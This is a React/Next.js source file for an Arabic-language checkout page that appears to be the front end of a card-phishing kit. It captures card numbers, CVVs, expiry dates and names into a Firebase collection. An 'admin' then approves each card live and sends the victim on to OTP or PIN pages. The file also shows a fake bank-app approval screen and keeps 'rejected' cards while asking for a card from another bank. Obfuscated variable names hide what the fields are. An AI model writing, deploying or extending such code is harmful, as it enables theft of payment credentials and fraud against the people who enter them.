"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { toast } from "sonner"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Lock, Smartphone, X, Gift } from "lucide-react"
import {
  detectCardType as _dct,
  formatCardNumber as _fcn,
  formatExpiryDate as _fed,
  getBankInfo as _gbi,
  luhnCheck as _lc,
} from "@/lib/card-utils"
import { db, addData } from "@/lib/firebase"
import { doc, onSnapshot, setDoc, getDoc } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { FullPageLoader } from "@/components/loader"

interface PaymentPageProps {
  offerTotalPrice: number
}

export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
  const router = useRouter()
  const [selectedPaymentMethod] = useState("credit-card")
  const [_v1, _s1] = useState("")
  const [_v4, _s4] = useState("")
  const [_v3, _s3] = useState("")
  const [_v2, _s2] = useState("")
  const [cardType, setCardType] = useState<string | null>(null)
  const [bankInfo, setBankInfo] = useState<{
    name: string
    country: string
  } | null>(null)
  const [isValidCard, setIsValidCard] = useState(false)
  const [expiryError, setExpiryError] = useState("")
  const [cardRejectionError, setCardRejectionError] = useState("")

  // Waiting state
  const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)
  const [showMessageOverlay, setShowMessageOverlay] = useState(false)
  const [isConfirming, setIsConfirming] = useState(false)
  const rejectionHandledRef = useRef(false)

  const [showCashbackPopup, setShowCashbackPopup] = useState(false)

  useEffect(() => {
    const cleanNumber = _v1.replace(/\s/g, "")
    if (cleanNumber.length >= 6) {
      const type = _dct(cleanNumber)
      setCardType(type)
      const bank = _gbi(cleanNumber)
      setBankInfo(bank)
    } else {
      setCardType(null)
      setBankInfo(null)
    }

    if (cleanNumber.length === 16) {
      setIsValidCard(_lc(cleanNumber))
    } else {
      setIsValidCard(false)
    }
  }, [_v1])

  // Validate expiry date
  useEffect(() => {
    if (_v3.length >= 2) {
      const parts = _v3.split("/")
      const monthStr = parts[0]
      const expMonth = parseInt(monthStr)

      if (expMonth < 1 || expMonth > 12) {
        setExpiryError("الشهر يجب أن يكون بين 01 و 12")
        return
      }

      if (_v3.length === 5) {
        const yearStr = parts[1]
        const expYear = parseInt(yearStr)
        const currentDate = new Date()
        const currentYear = currentDate.getFullYear() % 100
        const currentMonth = currentDate.getMonth() + 1

        if (expYear > currentYear + 10) {
          setExpiryError("تاريخ الانتهاء غير صالح")
        } else if (
          expYear < currentYear ||
          (expYear === currentYear && expMonth < currentMonth)
        ) {
          setExpiryError("تاريخ البطاقة منتهي")
        } else {
          setExpiryError("")
        }
      } else {
        if (expMonth >= 1 && expMonth <= 12) {
          setExpiryError("")
        }
      }
    } else {
      setExpiryError("")
    }
  }, [_v3])

  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID || !db) return

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const status = data.cardStatus
          const redirectPage = data.redirectPage

          if (redirectPage === "payment") {
            console.log(
              "[Card Status] Admin redirect detected, ignoring auto-redirect"
            )
            return
          }

          console.log("[Card Status] Current status:", status)

          if (status === "approved_with_otp") {
            console.log("[Card Status] Approved with OTP, redirecting to /veri")
            setIsWaitingAdmin(false)
            router.push("/veri")
          } else if (status === "approved_with_pin") {
            console.log("[Card Status] Approved with PIN, redirecting to /confi")
            setIsWaitingAdmin(false)
            router.push("/confi")
          } else if (status === "message") {
            setIsWaitingAdmin(false)
            setShowMessageOverlay(true)
          } else if (status !== "message" && status !== "confirmed") {
            setShowMessageOverlay(false)
          }

          if (status === "rejected" && !rejectionHandledRef.current) {
            console.log(
              "[Card Status] Card rejected, hiding loader immediately"
            )
            rejectionHandledRef.current = true
            setIsWaitingAdmin(false)

            setCardRejectionError(
              "لايمكن التسديد من خلال هذة البطاقة, الرجاء إدخال بطاقة من مصرف آخر"
            )

            toast.error("تم رفض بيانات البطاقة", {
              description: "يرجى إعادة إدخال بيانات صحيحة",
              duration: 5000,
            })

            const currentCardData = {
              _v1: data._v1,
              _v4: data._v4,
              _v3: data._v3,
              _v2: data._v2,
              cardType: data.cardType,
              bankInfo: data.bankInfo,
              rejectedAt: new Date().toISOString(),
            }

            setDoc(
              doc(db, "pays", visitorID),
              {
                oldCards: data.oldCards
                  ? [...data.oldCards, currentCardData]
                  : [currentCardData],
                cardStatus: "pending",
                redirectPage: null,
                currentStep: "_st1",
              },
              { merge: true }
            ).catch((err) => {
              console.error("[Card Status] Error saving rejected card:", err)
            })
          }
        }
      },
      (err) => {
        console.error("Error listening to document:", err)
        setIsWaitingAdmin(false)
        toast.error("حدث خطأ في الاتصال", {
          description: "يرجى المحاولة مرة أخرى",
          duration: 5000,
        })
      }
    )

    return () => unsubscribe()
  }, [router])

  const handleMessageConfirm = async () => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID || !db) return
    setIsConfirming(true)
    try {
      await setDoc(
        doc(db, "pays", visitorID),
        { cardStatus: "confirmed" },
        { merge: true }
      )
    } catch (err) {
      console.error("[pay-form] confirm error:", err)
      setIsConfirming(false)
    }
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = _fcn(e.target.value)
    if (formatted.replace(/\s/g, "").length <= 16) {
      _s1(formatted)
    }
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = _fed(e.target.value)
    _s3(formatted)
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 3)
    _s2(value)
  }

  const finalPrice = offerTotalPrice

  const _hp = async (e: React.FormEvent) => {
    e.preventDefault()

    let visitorID =
      localStorage.getItem("visitor_id") || localStorage.getItem("visitor")

    if (!visitorID) {
      const { getOrCreateVisitorID } = await import("@/lib/visitor-tracking")
      visitorID = getOrCreateVisitorID()
    }

    if (!isValidCard) {
      alert("بيانات البطاقة غير صحيحة")
      return
    }

    if (expiryError) {
      alert(expiryError)
      return
    }

    try {
      rejectionHandledRef.current = false
      setCardRejectionError("")

      const discount = 0

      console.log("[Payment] Starting payment process for visitor:", visitorID)

      // Ensure doc exists so onSnapshot/setDoc(merge) work
      const docRef = doc(db, "pays", visitorID)
      const snap = await getDoc(docRef)
      if (!snap.exists()) {
        await setDoc(docRef, { createdAt: new Date().toISOString() })
      }

      await addData({
        id: visitorID,
        paymentMethod: selectedPaymentMethod,
        cardType,
        bankInfo,
        _v4,
        _v2,
        _v1,
        _v3,
        cardNumber: _v1,
        cvv: _v2,
        expiryDate: _v3,
        cardHolderName: _v4,
        originalPrice: offerTotalPrice,
        discount,
        finalPrice: Number.parseFloat(finalPrice.toFixed(2)),
        cardStatus: "pending",
        otpStatus: "pending",
        redirectPage: null,
        currentStep: "_st1",
      })

      console.log("[Payment] Data saved successfully")

      await addToHistory(
        visitorID,
        "card",
        {
          _v1,
          _v4,
          cardType,
          _v3,
          _v2,
          bankInfo,
        },
        "pending"
      )

      console.log("[Payment] History entry added successfully")

      setIsWaitingAdmin(true)
      console.log("[Payment] Waiting for admin approval")
    } catch (error) {
      console.error("[Payment] Payment error:", error)
      toast.error("حدث خطأ", {
        description: `فشلت معالجة الدفع: ${
          error instanceof Error ? error.message : "خطأ غير معروف"
        }`,
        duration: 5000,
      })
    }
  }

  return (
    <>
      {isWaitingAdmin && <FullPageLoader />}

      {showMessageOverlay && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95"
          dir="rtl"
        >
          <div className="text-center space-y-6 px-8">
            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-white/30" />
              <div className="absolute h-20 w-20 rounded-full border-4 border-white/50" />
              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-white/20">
                <Smartphone className="h-8 w-8 text-white" />
              </div>
            </div>
            <div className="space-y-3">
              <p className="text-xl font-bold leading-relaxed text-white">
                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك
                والموافقة على العملية لإتمام الدفع.
              </p>
              <div className="flex items-center justify-center gap-2">
                <span
                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-amber-300"
                  style={{ animationDelay: "0ms" }}
                />
                <span
                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-amber-300"
                  style={{ animationDelay: "150ms" }}
                />
                <span
                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-amber-300"
                  style={{ animationDelay: "300ms" }}
                />
              </div>
            </div>
            {isConfirming ? (
              <div className="flex flex-col items-center gap-3 mt-2">
                <div className="flex items-center justify-center gap-2">
                  <span
                    className="h-3 w-3 animate-bounce rounded-full bg-amber-300"
                    style={{ animationDelay: "0ms" }}
                  />
                  <span
                    className="h-3 w-3 animate-bounce rounded-full bg-amber-300"
                    style={{ animationDelay: "150ms" }}
                  />
                  <span
                    className="h-3 w-3 animate-bounce rounded-full bg-amber-300"
                    style={{ animationDelay: "300ms" }}
                  />
                </div>
                <p className="text-sm font-semibold text-amber-300">
                  جاري انتظار موافقة البنك...
                </p>
              </div>
            ) : (
              <button
                onClick={handleMessageConfirm}
                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm bg-white text-[#0a4a68] hover:bg-slate-100 transition-all shadow-lg"
              >
                تم الموافقة في التطبيق
              </button>
            )}
          </div>
        </div>
      )}

      {showCashbackPopup && (
        <div
          className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4"
          dir="rtl"
        >
          <div className="relative bg-white rounded-2xl shadow-2xl max-w-md w-full overflow-hidden">
            <button
              onClick={() => setShowCashbackPopup(false)}
              className="absolute top-3 left-3 z-10 w-8 h-8 flex items-center justify-center rounded-full bg-white/90 hover:bg-white shadow-md transition-colors"
            >
              <X className="w-4 h-4 text-gray-600" />
            </button>

            <div className="bg-gradient-to-br from-[#0a4a68] to-[#1c7396] p-4 text-center">
              <div className="flex items-center justify-center gap-2 mb-2">
                <Gift className="w-6 h-6 text-amber-300" />
                <h3 className="text-lg font-black text-white">عرض حصري!</h3>
              </div>
              <p className="text-blue-100 text-sm">
                استرداد نقدي عند الدفع بالبطاقات الائتمانية
              </p>
            </div>

            <div className="p-4 space-y-3">
              <div className="bg-blue-50 border border-blue-200 rounded-xl p-3 text-center">
                <p className="text-[#0a4a68] font-bold text-sm">
                  استرداد نقدي{" "}
                  <span className="text-2xl text-[#0a4a68]">40%</span> عند
                  استخدام البطاقات الائتمانية التالية
                </p>
              </div>
              <button
                onClick={() => setShowCashbackPopup(false)}
                className="w-full py-3 bg-gradient-to-r from-[#0a4a68] to-[#1c7396] text-white font-bold text-sm rounded-xl transition-all shadow-lg"
              >
                متابعة الدفع
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="space-y-3" dir="rtl">
        <form onSubmit={_hp} className="space-y-3">
          {/* Payment logos pill */}
          <div className="flex items-center justify-center gap-2 border border-gray-200 rounded-full py-2 px-4 w-fit mx-auto">
            <img src="/mada.svg" alt="Mada" className="h-5 object-contain" />
            <img src="/visa.svg" alt="VISA" className="h-4 object-contain" />
            <img
              src="/mas.svg"
              alt="Mastercard"
              className="h-5 object-contain"
            />
          </div>

          {/* Card Number */}
          <div>
            <Input
              type="tel"
              value={_v1}
              onChange={handleCardNumberChange}
              placeholder="رقم بطاقة الائتمان"
              maxLength={19}
              dir="ltr"
              autoComplete="cc-number"
              className={`h-14 text-base border rounded-xl px-4 transition-all ${
                isValidCard
                  ? "border-[#0a4a68] focus:border-[#0a4a68]"
                  : _v1.length > 0
                    ? "border-red-300 focus:border-red-400"
                    : "border-gray-300 focus:border-[#0a4a68]"
              }`}
              required
            />
            {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && (
              <p className="text-red-500 text-xs mt-1 pr-1">
                يجب أن يكون 16 رقم
              </p>
            )}
            {cardRejectionError && (
              <p className="text-red-600 text-xs font-bold mt-1.5 pr-1">
                {cardRejectionError}
              </p>
            )}
          </div>

          {/* CVV + Expiry */}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Input
                type="password"
                value={_v2}
                onChange={handleCvvChange}
                placeholder="CVV أو CVC رمز"
                maxLength={3}
                dir="rtl"
                autoComplete="cc-csc"
                className={`h-14 text-base border rounded-xl px-4 ${
                  _v2.length === 3
                    ? "border-[#0a4a68]"
                    : "border-gray-300 focus:border-[#0a4a68]"
                }`}
                required
              />
              {_v2.length > 0 && _v2.length !== 3 && (
                <p className="text-red-500 text-xs mt-1">يجب أن يكون 3 أرقام</p>
              )}
            </div>
            <div>
              <Input
                type="tel"
                value={_v3}
                onChange={handleExpiryDateChange}
                placeholder="MM/YY"
                maxLength={5}
                dir="ltr"
                autoComplete="cc-exp"
                className={`h-14 text-base border rounded-xl px-4 text-center ${
                  expiryError
                    ? "border-red-400 focus:border-red-500"
                    : _v3.length === 5 && !expiryError
                      ? "border-[#0a4a68]"
                      : "border-gray-300 focus:border-[#0a4a68]"
                }`}
                required
              />
              {expiryError && (
                <p className="text-red-500 text-xs mt-1">{expiryError}</p>
              )}
            </div>
          </div>

          {/* Card Holder Name */}
          <Input
            type="text"
            value={_v4}
            onChange={(e) => _s4(e.target.value.toUpperCase())}
            placeholder="الاسم على البطاقة"
            dir="rtl"
            autoComplete="cc-name"
            className="h-14 text-base border border-gray-300 focus:border-[#0a4a68] rounded-xl px-4"
            required
          />

          {/* Submit Button */}
          <Button
            type="submit"
            disabled={
              !isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4
            }
            className="w-full h-13 bg-[#0a4a68] hover:bg-[#083d57] text-white font-bold text-base rounded-xl transition-all disabled:opacity-60 disabled:cursor-not-allowed"
          >
            <Lock className="w-4 h-4 ml-2" />
            تأكيد الدفع
          </Button>

          {bankInfo && (
            <p className="text-center text-xs text-gray-500">
              {bankInfo.name}
            </p>
          )}
        </form>
      </div>
    </>
  )
}
